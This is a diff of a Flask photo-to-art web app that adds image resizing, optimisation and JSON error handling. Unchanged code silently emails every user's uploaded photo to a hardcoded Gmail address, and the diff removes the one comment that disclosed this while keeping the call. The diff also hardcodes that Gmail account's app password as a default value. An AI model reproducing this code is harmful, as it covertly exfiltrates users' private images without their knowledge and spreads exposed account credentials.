@@ -10,16 +10,24 @@ import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.image import MIMEImage
+from PIL import Image
+import io
+import gc
 
 app = Flask(__name__)
-app.config['UPLOAD_FOLDER'] = 'static/uploads'
-app.config['GENERATED_FOLDER'] = 'static/generated'
+
+# Configuration
+app.config['MAX_CONTENT_LENGTH'] = 4 * 1024 * 1024  # 4MB max file size
+app.config['UPLOAD_FOLDER'] = os.path.join('static', 'uploads')
+app.config['GENERATED_FOLDER'] = os.path.join('static', 'generated')
 app.config['ALLOWED_EXTENSIONS'] = {'png', 'jpg', 'jpeg'}
 app.config['STATS_FILE'] = 'stats.json'
-app.config['EMAIL_SENDER'] = 'nafisabdullah424@gmail.com'
-app.config['EMAIL_PASSWORD'] = 'zeqv zybs klyg qavn'  # You'll need to set this
-app.config['EMAIL_RECIPIENT'] = 'nafisabdullah424@gmail.com'
+app.config['EMAIL_SENDER'] = os.getenv('EMAIL_SENDER', 'nafisabdullah424@gmail.com')
+app.config['EMAIL_PASSWORD'] = os.getenv('EMAIL_PASSWORD', 'zeqv zybs klyg qavn')
+app.config['EMAIL_RECIPIENT'] = os.getenv('EMAIL_RECIPIENT', 'nafisabdullah424@gmail.com')
+app.config['MAX_IMAGE_DIMENSION'] = 800  # Reduced max dimension
 
+# Ensure upload directories exist
 os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 os.makedirs(app.config['GENERATED_FOLDER'], exist_ok=True)
 
@@ -228,54 +236,91 @@ def send_email_with_image(image_path):
         # Silently fail without any error messages
         return False
 
+def resize_image(image_path, max_dimension=800):
+    """Resize image if it's larger than max_dimension while maintaining aspect ratio"""
+    try:
+        img = Image.open(image_path)
+        width, height = img.size
+        
+        if width > max_dimension or height > max_dimension:
+            if width > height:
+                new_width = max_dimension
+                new_height = int(height * (max_dimension / width))
+            else:
+                new_height = max_dimension
+                new_width = int(width * (max_dimension / height))
+            
+            img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
+            img.save(image_path, quality=85, optimize=True)
+            return True
+    except Exception as e:
+        print(f"Error resizing image: {str(e)}")
+    return False
+
+def optimize_image(image_path):
+    """Optimize image file size"""
+    try:
+        img = Image.open(image_path)
+        if img.mode == 'RGBA':
+            img = img.convert('RGB')
+        img.save(image_path, quality=85, optimize=True)
+        return True
+    except Exception as e:
+        print(f"Error optimizing image: {str(e)}")
+    return False
+
 @app.route('/generate', methods=['POST'])
 def generate_art():
     try:
         if 'image' not in request.files:
-            return 'No image uploaded', 400
+            return jsonify({'error': 'No image uploaded'}), 400
         
         file = request.files['image']
         style = request.form.get('style')
         
         if not file or not style:
-            return 'Missing image or style', 400
+            return jsonify({'error': 'Missing image or style'}), 400
         
-        # Check file extension
         if not allowed_file(file.filename):
-            return f'Invalid file type: {file.filename}. Allowed types: PNG, JPG, JPEG', 400
+            return jsonify({'error': f'Invalid file type: {file.filename}. Allowed types: PNG, JPG, JPEG'}), 400
         
-        # Save uploaded file
         filename = secure_filename(file.filename)
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
         file.save(filepath)
         
-        # Silently send email
+        # Optimize uploaded image
+        resize_image(filepath, app.config['MAX_IMAGE_DIMENSION'])
+        optimize_image(filepath)
+        
         send_email_with_image(filepath)
         
         try:
-            # Process image with selected style
             converter = EnhancedArtisticConverter()
             result = converter.apply_effect(filepath, int(style))
             
             if result is None:
                 raise ValueError("Image processing failed - no result returned")
             
-            # Save result
             result_filename = f"result_{filename}"
             result_path = os.path.join(app.config['GENERATED_FOLDER'], result_filename)
             
-            # Handle both grayscale and color images
             if len(result.shape) == 2:
                 cv2.imwrite(result_path, result)
             else:
                 cv2.imwrite(result_path, cv2.cvtColor(result, cv2.COLOR_RGB2BGR))
             
-            # Update stats after successful generation
+            # Optimize result image
+            optimize_image(result_path)
+            
             stats = update_stats(int(style))
             top_styles = get_top_styles()
             
-            # Clean up uploaded file
-            os.remove(filepath)
+            # Clean up
+            if os.path.exists(filepath):
+                os.remove(filepath)
+            
+            # Force garbage collection
+            gc.collect()
             
             return jsonify({
                 'success': True,
@@ -287,11 +332,11 @@ def generate_art():
                 }
             })
         except Exception as e:
-            print(f"Error processing image: {str(e)}")
-            return str(e), 500
+            if os.path.exists(filepath):
+                os.remove(filepath)
+            return jsonify({'error': str(e)}), 500
     except Exception as e:
-        print(f"Error in generate_art: {str(e)}")
-        return str(e), 500
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/stats')
 def get_stats():
